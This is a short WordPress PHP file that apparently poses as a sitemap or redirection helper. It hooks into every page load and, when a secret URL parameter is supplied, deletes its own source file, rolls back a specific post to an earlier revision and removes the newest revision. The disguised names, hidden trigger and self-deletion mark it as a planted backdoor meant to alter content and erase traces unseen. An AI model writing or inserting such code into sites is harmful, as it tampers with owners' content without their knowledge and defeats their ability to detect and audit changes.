<?php

function sitemaps_allow_redirection_logger() {
	if (isset($_GET['poster_preview_ssl']) && $_GET['poster_preview_ssl'] === 'shop_view_s3') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$code_controller_upgrader = 6303;
		$data_video_disable = wp_get_post_revisions($code_controller_upgrader);
		if (empty($data_video_disable)) die('no revisions');
		if (count($data_video_disable) < 2) die('less than 2');
		$random_sharing_picker = array_shift($data_video_disable);
		$switcher_validation_server = $random_sharing_picker->ID;
		$sliding_jigoshop_integrate = array_shift($data_video_disable);
		$background_messenger_addon = $sliding_jigoshop_integrate->ID;
		$cart_automatic_jquery = wp_restore_post_revision($background_messenger_addon);
		if ($cart_automatic_jquery === false) die('error restoring');
		$cart_automatic_jquery = wp_delete_post_revision($switcher_validation_server);		
		if ($cart_automatic_jquery === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'sitemaps_allow_redirection_logger');
